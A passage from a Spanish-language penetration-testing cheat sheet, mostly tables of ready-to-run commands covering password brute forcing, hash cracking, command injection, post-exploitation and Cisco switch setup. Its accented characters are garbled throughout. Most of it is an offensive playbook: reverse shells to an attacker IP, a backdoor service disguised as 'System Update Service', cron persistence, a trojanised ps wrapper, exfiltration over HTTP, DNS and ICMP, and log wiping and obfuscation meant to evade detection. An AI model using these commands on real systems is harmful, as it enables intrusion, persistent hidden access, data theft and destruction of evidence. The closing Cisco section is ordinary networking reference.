| **FTP (controlado)** | `hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -t 2 -w 5 ftp://<IP>`                                | Ataque controlado para evitar lockouts por m√∫ltiples intentos fallidos.            |
| **HTTP Basic Auth** | `hydra -L users.txt -P passwords.txt http-get://<IP>/admin/`                                                  | Ataque contra autenticaci√≥n b√°sica HTTP en rutas protegidas.                       |
| **HTTP POST Form** | `hydra -L users.txt -P passwords.txt <IP> http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"` | Ataque contra formularios web con validaci√≥n por respuesta (flag `F=`).       |


#### Tabla de Flags - Hydra (Brute Force)

| Flag | Funci√≥n Acad√©mica                               | Aplicaci√≥n Pr√°ctica                             |
|------|-------------------------------------------------|------------------------------------------------|
| `-L` | User List                                       | Lista de usuarios objetivo                     |
| `-l` | Single User                                     | Usuario espec√≠fico                             |
| `-P` | Password List                                   | Diccionario de passwords                       |
| `-p` | Single Password                                 | Password espec√≠fico                            |
| `-t` | Threads                                         | N√∫mero de conexiones paralelas                |
| `-w` | Wait Time                                       | Delay entre intentos (segundos)               |
| `-v` | Verbose                                         | Output detallado del progreso                 |
| `-f` | Fast Mode                                       | Parar al encontrar primera credencial v√°lida  |

### 3.3 Cracking de Hashes con John the Ripper

#### Extracci√≥n y Preparaci√≥n de Hashes

| T√©cnica                    | Comando                                          | Prop√≥sito Acad√©mico                              |
|----------------------------|--------------------------------------------------|--------------------------------------------------|
| Preparaci√≥n sistema Linux  | `unshadow /etc/passwd /etc/shadow > hashes.txt` | Combinaci√≥n de archivos para an√°lisis           |
| Identificaci√≥n de formato  | `john --list=formats | grep -i [tipo]`          | Identificar algoritmo criptogr√°fico correcto    |

#### T√©cnicas de Cracking Avanzadas

| T√©cnica                    | Comando                                          | Prop√≥sito Acad√©mico                              |
|----------------------------|--------------------------------------------------|--------------------------------------------------|
| Cracking b√°sico            | `john hashes.txt`                                | Ataque usando patrones predefinidos             |
| Ataque con diccionario     | `john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt` | Ataque basado en passwords comunes |
| Cracking con reglas        | `john --rules --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt` | Aplicaci√≥n de mutaciones algor√≠tmicas |
| Mostrar resultados         | `john --show hashes.txt`                         | Visualizaci√≥n de credenciales comprometidas     |
| Formato espec√≠fico         | `john --format=raw-md5 --wordlist=rockyou.txt hash.txt` | Ataques optimizados por algoritmo          |

#### Tabla de Flags - John the Ripper

| Par√°metro      | Funci√≥n Acad√©mica                              | Fundamento Criptogr√°fico                         |
|----------------|------------------------------------------------|---------------------------------------------------|
| `--wordlist`   | Dictionary Attack                              | Ataque basado en passwords comunes               |
| `--rules`      | Rule-based Attack                              | Mutaciones algor√≠tmicas de wordlist              |
| `--format`     | Hash Format                                    | Especificar algoritmo criptogr√°fico              |
| `--show`       | Display Results                                | Mostrar passwords crackeados                     |
| `--incremental`| Brute Force                                    | Generaci√≥n exhaustiva de combinaciones           |

### 3.4 Payloads de Inyecci√≥n Manual

#### Inyecci√≥n de Comandos en Aplicaciones Web

| Tipo de Payload              | Ejemplo                                          | Prop√≥sito Acad√©mico                              |
|------------------------------|--------------------------------------------------|--------------------------------------------------|
| Inyecci√≥n b√°sica             | `127.0.0.1; whoami`                             | Verificar contexto de usuario                   |
| Inyecci√≥n con informaci√≥n    | `127.0.0.1; uname -a`                           | Obtener informaci√≥n del sistema                  |
| Inyecci√≥n condicional        | `127.0.0.1 && id`                               | Ejecutar si comando anterior tiene √©xito        |
| Inyecci√≥n con pipe           | `127.0.0.1 | whoami`                            | Redirecci√≥n de output                            |
| Timing injection             | `127.0.0.1; sleep 5 && echo "test"`             | Detectar inyecci√≥n sin output visible           |
| Timing con ping              | `127.0.0.1; ping -c 5 127.0.0.1`               | Alternativa para blind injection                |
| PHP espec√≠fico               | `127.0.0.1; php -r 'echo "Max execution time: " . ini_get("max_execution_time");'` | Ejecutar c√≥digo PHP inline |

#### Reverse Shell Payloads

| Tipo                         | Payload                                          | Prop√≥sito Acad√©mico                              |
|------------------------------|--------------------------------------------------|--------------------------------------------------|
| Bash reverse shell           | `127.0.0.1; bash -i >& /dev/tcp/[IP_atacante]/4444 0>&1` | Establecimiento de acceso remoto directo    |
| Python reverse shell         | `127.0.0.1; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[IP]",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash"])'` | Shell usando Python |
| Reverse shell persistente    | `127.0.0.1; nohup bash -c 'bash -i >& /dev/tcp/[IP]/[PUERTO] 0>&1' &` | Shell que sobrevive cierre de conexi√≥n original |

### 3.5 An√°lisis de Vulnerabilidades Web con SQLMap

#### Comandos B√°sicos de SQLMap

| T√©cnica                      | Comando                                          | Prop√≥sito Acad√©mico                              |
|------------------------------|--------------------------------------------------|--------------------------------------------------|
| Test b√°sico de inyecci√≥n     | `sqlmap -u "http://[IP]/products.php?id=1"`     | Identificar vulnerabilidad SQL injection        |
| Enumerar bases de datos      | `sqlmap -u "[URL]" --dbs --batch`               | Listar bases de datos disponibles               |
| Enumerar tablas              | `sqlmap -u "[URL]" -D [database] --tables`      | Listar tablas de base de datos espec√≠fica       |
| Extraer datos                | `sqlmap -u "[URL]" -D [db] -T [table] --dump`   | Extraer contenido de tabla espec√≠fica           |

#### Tabla de Flags - SQLMap

| Flag/Par√°metro | Funci√≥n Acad√©mica                               | Fundamento T√©cnico                                |
|----------------|------------------------------------------------|---------------------------------------------------|
| `-u`           | URL objetivo para prueba                       | Endpoint espec√≠fico con par√°metro vulnerable     |
| `--dbs`        | Enumerar bases de datos                        | Listar esquemas disponibles post-compromiso      |
| `--batch`      | Modo no interactivo                            | Acepta opciones por defecto, automatizaci√≥n      |
| `-D`           | Especificar base de datos                      | Seleccionar esquema espec√≠fico para enumerar     |
| `--tables`     | Listar tablas                                  | Mostrar estructura de base de datos               |
| `-T`           | Especificar tabla                              | Seleccionar tabla espec√≠fica para extraer        |
| `--dump`       | Extraer datos                                  | Volcado completo del contenido de tabla          |

---


## üöÄ FASE 4: POST-EXPLOTACI√ìN

### 4.1 Reconocimiento Post-Explotaci√≥n

#### An√°lisis Inicial del Sistema Comprometido

| T√©cnica                      | Comando                              | Prop√≥sito Acad√©mico                              |
|------------------------------|--------------------------------------|--------------------------------------------------|
| Verificaci√≥n de identidad    | `whoami`                             | Confirmar contexto de usuario actual            |
| An√°lisis de privilegios      | `id`                                 | An√°lisis completo de privilegios (UID, GID)     |
| Informaci√≥n del sistema      | `uname -a`                           | Fingerprinting completo del sistema             |
| Release del OS               | `cat /etc/os-release`                | Identificar distribuci√≥n espec√≠fica             |
| Versi√≥n del kernel           | `cat /proc/version`                  | Informaci√≥n detallada del kernel                |
| Enumeraci√≥n de usuarios      | `cat /etc/passwd`                    | Mapeo de usuarios del sistema                   |
| Estructura de grupos         | `cat /etc/group`                     | Mapeo de grupos y permisos                      |
| Procesos activos             | `ps aux`                             | An√°lisis de procesos y propietarios             |
| Procesos detallados          | `ps -eo pid,ppid,user,command`       | Vista estructurada de jerarqu√≠a de procesos     |

#### An√°lisis de Red Interna

| T√©cnica                      | Comando                              | Prop√≥sito Acad√©mico                              |
|------------------------------|--------------------------------------|--------------------------------------------------|
| Descubrimiento interno       | `for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i 2>/dev/null | grep "64 bytes"; done` | Mapeo de red interna para movimiento lateral |
| Tabla ARP                    | `arp -a`                             | Identificar hosts que han comunicado             |
| Vecinos IP                   | `ip neigh`                           | Asociaciones IP-MAC recientes                    |
| Conexiones activas           | `netstat -tupln`                     | Mapear comunicaciones desde host comprometido   |
| Conexiones activas (moderno) | `ss -tupln`                          | Versi√≥n moderna de netstat                       |

### 4.2 Escalaci√≥n de Privilegios

#### Enumeraci√≥n de Vectores de Escalaci√≥n

| T√©cnica                      | Comando                              | Prop√≥sito Acad√©mico                              |
|------------------------------|--------------------------------------|--------------------------------------------------|
| Permisos sudo                | `sudo -l`                            | Identificar comandos con privilegios elevados   |
| Binarios SUID                | `find / -perm -4000 2>/dev/null`     | Localizar binarios con bit SUID                 |
| Binarios SUID (alternativo)  | `find / -perm -u=s -type f 2>/dev/null` | M√©todo alternativo para SUID                    |
| Archivos escribibles         | `find / -writable 2>/dev/null | grep -v proc | grep -v sys` | Identificar archivos modificables |
| Tareas programadas usuario   | `crontab -l`                         | Ver tareas programadas del usuario actual       |
| Tareas sistema               | `cat /etc/crontab`                   | Ver tareas programadas del sistema              |
| Directorios cron             | `ls -la /etc/cron.*`                 | Analizar todos los directorios de cron          |

#### Explotaci√≥n de Sudo/SUID (Referencia GTFOBins)

| Vector                       | Comando                              | Prop√≥sito Acad√©mico                              |
|------------------------------|--------------------------------------|--------------------------------------------------|
| Escalaci√≥n con nmap          | `sudo nmap --interactive`<br/>`nmap> !sh` | Abuso de funcionalidad leg√≠tima               |
| Escalaci√≥n con vim           | `sudo vim -c ':!/bin/sh'`            | Escape de vim a shell privilegiada              |
| Escalaci√≥n con find          | `sudo find /etc -exec sh -i \;`      | Ejecuci√≥n de shell via find                     |
| Escalaci√≥n con awk           | `sudo awk 'BEGIN {system("/bin/sh")}'` | Escalaci√≥n usando AWK                         |

#### Scripts de Automatizaci√≥n para Escalaci√≥n

| Herramienta | Comando                                          | Prop√≥sito Acad√©mico                              |
|-------------|--------------------------------------------------|--------------------------------------------------|
| LinEnum     | `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`<br/>`chmod +x LinEnum.sh`<br/>`./LinEnum.sh` | Enumeraci√≥n automatizada de vectores |
| LinPEAS     | `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh` | An√°lisis automatizado con scoring |

### 4.3 An√°lisis de Vulnerabilidades del Kernel

#### Identificaci√≥n de Versi√≥n del Kernel

| T√©cnica                      | Comando                              | Prop√≥sito Acad√©mico                              |
|------------------------------|--------------------------------------|--------------------------------------------------|
| Versi√≥n del kernel           | `uname -r` (y luego `searchsploit`)            | Informaci√≥n exacta para b√∫squeda de exploits    |
| Informaci√≥n detallada        | `cat /proc/version`                  | Versi√≥n completa con informaci√≥n de compilaci√≥n |
| Release del sistema          | `cat /etc/issue`                     | Identificar distribuci√≥n y versi√≥n              |

#### B√∫squeda y Ejecuci√≥n de Exploits

| T√©cnica                      | Comando                              | Prop√≥sito Acad√©mico                              |
|------------------------------|--------------------------------------|--------------------------------------------------|
| B√∫squeda de exploits locales | `searchsploit linux kernel [versi√≥n]` | Correlaci√≥n versi√≥n-vulnerabilidad              |
| B√∫squeda por distribuci√≥n    | `searchsploit ubuntu [versi√≥n]`      | Exploits espec√≠ficos de distribuci√≥n            |
| Compilaci√≥n de exploit       | `gcc -o exploit exploit.c`           | Preparaci√≥n de exploit compilado                 |
| Ejecuci√≥n                    | `chmod +x exploit`<br/>`./exploit`   | Escalaci√≥n via vulnerabilidades del kernel      |

### 4.4 T√©cnicas Avanzadas de Persistencia

#### Backdoors en Servicios del Sistema

| T√©cnica                      | Comando                              | Prop√≥sito Acad√©mico                              |
|------------------------------|--------------------------------------|--------------------------------------------------|
| Persistencia crontab         | `echo "*/10 * * * * /bin/bash -c 'bash -i >& /dev/tcp/[IP]/4444 0>&1'" >> /var/spool/cron/root` | Persistencia temporal automatizada |
| Servicio systemd             | Ver script completo en secci√≥n de c√≥digo | Persistencia robusta integrada al sistema       |

**Script Completo para Servicio Systemd**:
```bash
cat > /etc/systemd/system/system-update.service << EOF
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/[IP_atacante]/4444 0>&1'
Restart=always
RestartSec=60
User=root

[Install]
WantedBy=multi-user.target
EOF
systemctl enable system-update.service
systemctl start system-update.service
# PROP√ìSITO: Persistencia robusta integrada al sistema
# VENTAJA: Reinicio autom√°tico, dif√≠cil detecci√≥n
```

#### Modificaci√≥n de Binarios Leg√≠timos

| Paso                         | Comando                              | Prop√≥sito Acad√©mico                              |
|------------------------------|--------------------------------------|--------------------------------------------------|
| Backup del original          | `cp /bin/ps /bin/ps.bak`             | Preservar funcionalidad original                 |
| Crear wrapper malicioso      | Ver script en secci√≥n de c√≥digo      | Backdoor transparente en comando com√∫n          |
| Implementar wrapper          | `mv /tmp/ps_wrapper.sh /bin/ps`      | Interceptaci√≥n de comandos rutinarios           |

### 4.5 Movimiento Lateral Avanzado

#### SSH Tunneling y Port Forwarding

| T√©cnica                      | Comando                              | Prop√≥sito Acad√©mico                              |
|------------------------------|--------------------------------------|--------------------------------------------------|
| T√∫nel local                  | `ssh -L [puerto_local]:127.0.0.1:[puerto_remoto] user@[IP]` | Acceso a servicios internos via SSH           |
| T√∫nel remoto                 | `ssh -R [puerto_remoto]:127.0.0.1:[puerto_local] user@[IP]` | Exposici√≥n de servicios del host comprometido |
| T√∫nel din√°mico (SOCKS)       | `ssh -D [puerto_local] user@[IP]`    | Proxy SOCKS para enrutamiento de herramientas  |

#### Tabla de Flags - SSH Tunneling

| Flag | Funci√≥n Acad√©mica                               | Fundamento T√©cnico                                |
|------|-------------------------------------------------|---------------------------------------------------|
| `-L` | Local Port Forwarding                           | Redirecci√≥n de puerto local a remoto              |
| `-R` | Remote Port Forwarding                          | Redirecci√≥n de puerto remoto a local              |
| `-D` | Dynamic Port Forwarding (SOCKS proxy)          | Proxy din√°mico para m√∫ltiples conexiones         |

#### Pivoting con Chisel (Herramienta Moderna)

| Fase                         | Comando                              | Prop√≥sito Acad√©mico                              |
|------------------------------|--------------------------------------|--------------------------------------------------|
| Descarga y preparaci√≥n       | `wget https://github.com/jpillora/chisel/releases/latest/download/chisel_linux_amd64.gz` | Obtener herramienta de tunneling HTTP          |
| Servidor (atacante)          | `./chisel server --port 9999 --reverse` | Configurar servidor para conexiones reversas    |
| Cliente (host comprometido)  | `./chisel client [IP_atacante]:9999 R:8080:192.168.1.200:80` | T√∫nel reverso hacia host interno            |

#### Configuraci√≥n de Proxychains

| T√©cnica                      | Comando                              | Prop√≥sito Acad√©mico                              |
|------------------------------|--------------------------------------|--------------------------------------------------|
| Configuraci√≥n proxy          | `echo "socks5 127.0.0.1 9050" >> /etc/proxychains4.conf` | Configurar enrutamiento via proxy           |
| Uso con herramientas         | `proxychains nmap -sT -Pn [IP_interno]` | Enrutamiento de tr√°fico via host comprometido   |
| Uso con curl                 | `proxychains curl http://192.168.1.200` | Acceso a servicios web internos                  |

### 4.6 B√∫squeda de Informaci√≥n Sensible

#### Enumeraci√≥n de Credenciales y Configuraciones

| T√©cnica                      | Comando                              | Prop√≥sito Acad√©mico                              |
|------------------------------|--------------------------------------|--------------------------------------------------|
| Archivos de configuraci√≥n    | `find / -type f -name "*.conf" -exec grep -l "password\|passwd\|pwd\|key" {} \; 2>/dev/null` | Localizaci√≥n de credenciales hardcodeadas |
| Strings de bases de datos    | `find / -name "*.php" -o -name "*.py" -o -name "*.pl" | xargs grep -l "mysql\|postgresql\|oracle\|mongodb" 2>/dev/null` | Identificar aplicaciones con acceso a BD |
| Claves SSH privadas          | `find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "*.pem" 2>/dev/null` | Encontrar claves para movimiento lateral |
| Historial de comandos        | `find /home -name ".bash_history" -o -name ".zsh_history" -o -name ".history" 2>/dev/null` | Buscar comandos con credenciales |
| Historial root               | `cat /root/.bash_history 2>/dev/null` | Analizar comandos ejecutados por root           |

#### Extracci√≥n de Informaci√≥n de Procesos

| T√©cnica                      | Comando                              | Prop√≥sito Acad√©mico                              |
|------------------------------|--------------------------------------|--------------------------------------------------|
| Procesos con datos cr√≠ticos  | `ps aux | grep -E "mysql|postgres|apache|nginx|redis"` | Identificar procesos que manejan datos cr√≠ticos |
| Variables de entorno         | `cat /proc/[PID]/environ | tr '\0' '\n'` | Extracci√≥n de credenciales de ENV vars          |
| Archivos abiertos            | `lsof -p [PID]`                      | Ver archivos y conexiones de proceso espec√≠fico |

### 4.7 Exfiltraci√≥n de Datos

#### Compresi√≥n y Preparaci√≥n

| T√©cnica                      | Comando                              | Prop√≥sito Acad√©mico                              |
|------------------------------|--------------------------------------|--------------------------------------------------|
| Compresi√≥n sigilosa          | `tar -czf /tmp/.backup.tar.gz /home/*/Documents /home/*/Desktop /var/www 2>/dev/null` | Preparar datos para exfiltraci√≥n |
| B√∫squeda de archivos valiosos | `find / -type f \( -name "*.xls*" -o -name "*.doc*" -o -name "*.pdf" -o -name "*.db" \) 2>/dev/null` | Localizaci√≥n automatizada de informaci√≥n valiosa |

#### M√©todos de Exfiltraci√≥n

| M√©todo                       | Comando                              | Prop√≥sito Acad√©mico                              |
|------------------------------|--------------------------------------|--------------------------------------------------|
| Exfiltraci√≥n HTTP POST       | `curl -X POST -F "file=@/tmp/.backup.tar.gz" http://[IP]:8080/upload` | Transferencia via HTTP est√°ndar             |
| Exfiltraci√≥n DNS             | `xxd -p /tmp/secret.txt | fold -w32 | while read line; do dig $line.attacker.com; done` | Exfiltraci√≥n usando protocolo DNS    |
| Exfiltraci√≥n ICMP            | `xxd -p /tmp/data.txt | fold -w32 | while read line; do ping -c 1 -s 56 -p $line [IP]; done` | Usar paquetes ICMP para transferir datos |

### 4.8 T√©cnicas de Evasi√≥n y Anti-Forense

#### Limpieza de Evidencias

| T√©cnica                      | Comando                              | Prop√≥sito Acad√©mico                              |
|------------------------------|--------------------------------------|--------------------------------------------------|
| Limpieza de logs sistema     | `echo "" > /var/log/auth.log`<br/>`echo "" > /var/log/syslog` | Eliminaci√≥n de evidencia de acceso            |
| Limpieza logs web            | `echo "" > /var/log/apache2/access.log`<br/>`echo "" > /var/log/nginx/access.log` | Borrar rastros de ataques web       |
| Limpieza historial           | `history -c`<br/>`echo "" > ~/.bash_history`<br/>`unset HISTFILE` | Borrar rastro de comandos ejecutados    |
| Manipulaci√≥n timestamps      | `touch -r /bin/ls /path/to/malicious/file` | Modificar timestamps para ocultar actividad     |

#### Ofuscaci√≥n de Comandos

| T√©cnica                      | Comando                              | Prop√≥sito Acad√©mico                              |
|------------------------------|--------------------------------------|--------------------------------------------------|
| Codificaci√≥n Base64          | `echo "cat /etc/shadow" | base64`<br/>`echo "Y2F0IC9ldGMvc2hhZG93Cg==" | base64 -d | sh` | Ofuscaci√≥n de comandos sensibles |
| Fragmentaci√≥n variables      | `a='cat'; b='/etc/'; c='shadow'; $a $b$c` | Fragmentar comandos para evitar firmas           |
| Timing aleatorio             | `sleep $((RANDOM % 300 + 60)) && /path/to/command` | Introducir delays aleatorios                   |

#### Ocultaci√≥n de Procesos y Archivos

| T√©cnica                      | Comando                              | Prop√≥sito Acad√©mico                              |
|------------------------------|--------------------------------------|--------------------------------------------------|
| Directorios sigilosos        | `mkdir /var/tmp/...`<br/>`mkdir /tmp/.hidden`<br/>`mkdir /dev/shm/.cache` | Almacenamiento sigiloso de herramientas |
| Procesos disfrazados         | `cp /bin/bash /tmp/[kthread]`<br/>`/tmp/[kthread] -c 'bash -i >& /dev/tcp/[IP]/4444 0>&1'` | Disfrazar procesos como del kernel |

---


## üåê FASE 5: METODOLOG√çA DE TRANSFERENCIA DE ARCHIVOS

### 5.1 Transferencia desde Atacante hacia Objetivo

| M√©todo                       | Comando Atacante                              | Comando Objetivo                              | Prop√≥sito Acad√©mico                              |
|------------------------------|-----------------------------------------------|------------------------------------------------|--------------------------------------------------|
| Servidor HTTP Python3       | `python3 -m http.server 8000`                 | `wget http://<IP_atacante>:8000/<archivo>`     | Servir herramientas y exploits                  |
| Servidor HTTP Python2       | `python2 -m SimpleHTTPServer 8000`            | `curl http://<IP_atacante>:8000/<archivo> -o <archivo>` | Compatibilidad con sistemas antiguos           |
| Netcat unidireccional       | `nc -w 3 <IP_objetivo> 1234 < archivo.txt`    | `nc -l -p 1234 > archivo.txt`                  | Transferencia directa sin protocolos complejos  |
| Netcat inverso (objetivo inicia) | `nc -lvnp 1234 < archivo.txt`             | `nc <IP_atacante> 1234 > archivo.txt`          | Transferencia iniciada por el objetivo hacia el atacante |

### 5.2 Transferencia Bidireccional y Avanzada

| M√©todo                       | Comando                              | Prop√≥sito Acad√©mico                              |
|------------------------------|--------------------------------------|--------------------------------------------------|
| Netcat bidireccional         | `nc -l -p 1234`                      | Establecer canal de comunicaci√≥n bidireccional  |
| SCP (si SSH disponible)      | `scp archivo.txt user@[IP_objetivo]:/tmp/`    | Transferencia segura sobre SSH                   |
| Base64 encoding             | `base64 archivo.txt` ‚Üí copiar ‚Üí `echo "[base64]" | base64 -d > archivo.txt` | Transferencia de archivos peque√±os via terminal |

#### Tabla de Flags - Transferencia de Archivos

| Flag | Herramienta | Funci√≥n Acad√©mica                               | Fundamento T√©cnico                                |
|------|-------------|-------------------------------------------------|---------------------------------------------------|
| `-w` | netcat      | Wait time - timeout de conexi√≥n                | Evita conexiones colgadas indefinidamente        |
| `-l` | netcat      | Listen mode - escuchar conexiones entrantes    | Modo servidor para recibir datos                 |
| `-p` | netcat      | Port - especificar puerto de escucha           | Puerto espec√≠fico para el canal de datos         |
| `-o` | curl        | Output file - guardar en archivo espec√≠fico    | Especificar destino de descarga                  |

---

## üåê FASE 6: INFRAESTRUCTURA DE RED Y CISCO

### 6.1 Fundamentos de CLI Cisco

#### Modos de Configuraci√≥n

| Modo                  | Prompt T√≠pico        | Comando de Acceso            | Prop√≥sito Principal                              |
|-----------------------|----------------------|------------------------------|--------------------------------------------------|
| EXEC del Usuario      | `Router>`            | (Acceso inicial)             | Vista limitada, comandos b√°sicos                |
| EXEC Privilegiado     | `Router#`            | `enable`                     | Acceso completo ("admin")                       |
| Configuraci√≥n Global  | `Router(config)#`    | `configure terminal`         | Cambios que afectan todo el dispositivo         |
| Configuraci√≥n Interfaz| `Router(config-if)#` | `interface [nombre]`         | Configurar interfaz espec√≠fica                  |
| Configuraci√≥n L√≠nea   | `Router(config-line)#` | `line console 0`           | Configurar acceso por consola/terminal          |
| Configuraci√≥n VLAN    | `Router(config-vlan)#` | `vlan [n√∫mero]`            | Configurar VLAN espec√≠fica                       |
| Configuraci√≥n Subinterfaz | `Router(config-subif)#` | `interface [if].[sub]`   | Configurar subinterfaz para Inter-VLAN           |

#### Comandos de Ayuda y Navegaci√≥n

| Tarea                      | Comando/Tecla            | Funci√≥n Acad√©mica                                |
|----------------------------|--------------------------|--------------------------------------------------|
| Obtener ayuda contextual   | `?`                      | Mostrar comandos/opciones disponibles           |
| Autocompletado            | `Tab`                    | Completar comando autom√°ticamente               |
| Salir un nivel            | `exit`                   | Retroceder en jerarqu√≠a de configuraci√≥n        |
| Salir a modo privilegiado | `end`                    | Salir directamente a modo EXEC privilegiado     |

### 6.2 Configuraci√≥n B√°sica de Dispositivos

#### Configuraci√≥n Inicial Segura

| Paso | Comando                              | Modo                | Prop√≥sito Acad√©mico                              |
|------|--------------------------------------|---------------------|--------------------------------------------------|
| 1    | `hostname R1`                        | `(config)#`         | Establecer identidad √∫nica del dispositivo      |
| 2    | `enable secret [contrase√±a_fuerte]`  | `(config)#`         | Protecci√≥n de acceso privilegiado               |
| 3    | `service password-encryption`        | `(config)#`         | Cifrar passwords en configuraci√≥n               |
| 4    | `line console 0`<br/>`password [contrase√±a]`<br/>`login`<br/>`logging synchronous` | `(config)#` | Asegurar acceso f√≠sico al dispositivo |
| 5    | `line vty 0 4`<br/>`password [contrase√±a]`<br/>`login`<br/>`transport input ssh` | `(config)#` | Configurar acceso remoto seguro √∫nicamente SSH |

#### Persistencia de Configuraci√≥n

| Comando                               | Modo        | Prop√≥sito Cr√≠tico                                |
|---------------------------------------|-------------|--------------------------------------------------|
| `copy running-config startup-config` | `#`         | Persistir configuraci√≥n tras reinicio           |
| `write memory`                        | `#`         | Comando alternativo para guardar configuraci√≥n  |
| `wr`                                  | `#`         | Forma abreviada de write memory                 |

### 6.3 Configuraci√≥n de VLANs y Switching

#### Creaci√≥n y Gesti√≥n de VLANs

| Tarea                        | Comando                              | Modo           | Prop√≥sito Acad√©mico                              |
|------------------------------|--------------------------------------|----------------|--------------------------------------------------|
| Crear VLAN con nombre        | `vlan 10`<br/>`name VENTAS`         | `(config)#`    | Segmentaci√≥n l√≥gica de red por departamento     |
| Crear VLAN adicional         | `vlan 20`<br/>`name CONTABILIDAD`   | `(config)#`    | Separaci√≥n de tr√°fico por funci√≥n               |
| Ver VLANs creadas            | `show vlan brief`                    | `#`            | Verificar VLANs y asignaci√≥n de puertos         |

#### Asignaci√≥n de Puertos a VLANs

| Tipo de Puerto | Comando                              | Modo           | Prop√≥sito Acad√©mico                              |
|----------------|--------------------------------------|----------------|--------------------------------------------------|
| Puerto Acceso  | `interface fastethernet 0/1`<br/>`switchport mode access`<br/>`switchport access vlan 10`<br/>`no shutdown` | `(config)#` | Asignar dispositivo final a VLAN espec√≠fica |
| Puerto Troncal | `interface fastethernet 0/24`<br/>`switchport mode trunk`<br/>`switchport trunk allowed vlan 10,20,30` | `(config)#` | Permitir tr√°fico de m√∫ltiples VLANs |

### 6.4 Enrutamiento Inter-VLAN (Router on a Stick)

#### Configuraci√≥n de Subinterfaces

| Paso | Comando                              | Modo                | Prop√≥sito Acad√©mico                              |
|------|--------------------------------------|---------------------|--------------------------------------------------|
| 1    | `interface gigabitethernet 0/0`<br/>`no shutdown` | `(config)#`    | Habilitar interfaz f√≠sica para subinterfaces    |
| 2    | `interface gigabitethernet 0/0.10`   | `(config)#`         | Crear interfaz virtual para VLAN 10             |
| 3    | `encapsulation dot1q 10`             | `(config-subif)#`   | Definir etiqueta VLAN (802.1Q)                  |
| 4    | `ip address 192.168.10.1 255.255.255.0` | `(config-subif)#` | Asignar IP gateway para dispositivos VLAN       |
| 5    | `interface gigabitethernet 0/0.20`   | `(config)#`         | Crear subinterfaz para VLAN 20                  |
| 6    | `encapsulation dot1q 20`             | `(config-subif)#`   | Encapsulaci√≥n 802.1Q para VLAN 20               |
| 7    | `ip address 192.168.20.1 255.255.255.0` | `(config-subif)#` | Gateway independiente para VLAN 20            |

### 6.5 Comandos de Diagn√≥stico y Verificaci√≥n

#### Comandos Show Fundamentales

| Tarea                       | Comando show                | Modo         | Funci√≥n TL;DR                                         |
|-----------------------------|-----------------------------|--------------|-------------------------------------------------------|
| Resumen r√°pido interfaces    | `show ip interface brief`  | `#`          | Muestra IPs y estado (up/up o down/down).             |
| Estado f√≠sico de puertos     | `show interfaces status`   | `#`          | Muestra estado, VLAN, d√∫plex, velocidad.              |
| Resumen VLANs y puertos      | `show vlan brief`          | `#`          | Muestra VLANs y puertos asociados.                     |
| Ver puertos troncales        | `show interfaces trunk`    | `#`          | Lista puertos en modo trunk y VLANs permitidas.       |
| Ver modo puerto espec√≠fico   | `show interfaces [puerto] switchport` | `#` | Muestra modo access/trunk y detalles.                  |
| Ver tabla MAC del switch     | `show mac address-table`   | `#`          | Muestra MACs aprendidas, puerto y VLAN.                |
| Ver estado Spanning-Tree     | `show spanning-tree`       | `#`          | Info protocolo que previene bucles.                    |
| Ver tabla enrutamiento       | `show ip route`            | `#`          | Confirma rutas conocidas por router.                   |

---

#### Interpretaci√≥n Tabla Enrutamiento (show ip route)

Este comando es crucial para verificar que el router conoce las rutas a las diferentes redes, incluidas las VLANs. Entender los c√≥digos de origen es fundamental.

| C√≥digo | Significado | Descripci√≥n                                      |
|--------|-------------|-------------------------------------------------|
| L      | Local       | IP asignada a interfaz del router (ruta host). |
| C      | Conectada   | Red directamente conectada a interfaz activa.  |
| S      | Static      | Ruta est√°tica configurada manualmente.          |
| O      | OSPF        | Ruta aprendida por protocolo OSPF.               |
| D      | DUAL (EIGRP)| Ruta aprendida por EIGRP.                         |
| R      | RIP         | Ruta aprendida por RIP.                           |
| B      | BGP         | Ruta aprendida por BGP.                           |
| S*     | Ruta Est√°tica Candidata a Predeterminada | Ruta est√°tica 0.0.0.0/0 puerta de enlace por defecto.|

**Aplicaci√≥n Inter-VLAN:**

- Cada subinterfaz para VLAN es una red conectada.
- En tabla ver√°s:
  - `C` para red VLAN (ej: `C 192.168.10.0/24 is directly connected, GigabitEthernet0/0.10`)
  - `L` para IP gateway VLAN (ej: `L 192.168.10.1/32 is directly connected, GigabitEthernet0/0.10`)

Estas entradas confirman que enrutamiento Inter-VLAN funciona correctamente.
